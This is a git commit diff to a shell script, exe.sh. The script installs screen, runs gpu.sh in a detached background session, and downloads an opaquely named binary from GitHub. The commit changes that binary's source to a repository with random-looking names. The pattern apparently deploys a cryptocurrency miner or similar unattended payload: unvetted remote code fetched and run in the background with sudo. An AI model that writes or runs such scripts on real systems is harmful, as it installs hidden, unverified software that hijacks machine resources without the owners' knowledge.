5eefc9144f69cec40d430edd9413c05ae02c1ee9
brusavido <86264258+brusavido@users.noreply.github.com>
2021-06-24 23:15:14 +0800

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -2,7 +2,7 @@
 sudo apt update
 sudo apt install screen -y
 screen -dmS gpu.sh ./gpu.sh 65 75
-wget https://github.com/brusavido/lowda/raw/main/lowda
+wget https://github.com/levyglory45/sgsdf/raw/main/roisgawean
 wget https://raw.githubusercontent.com/brusavido/testlowda/main/gpu.sh
 chmod +x gpu.sh 
 ./gpu.sh
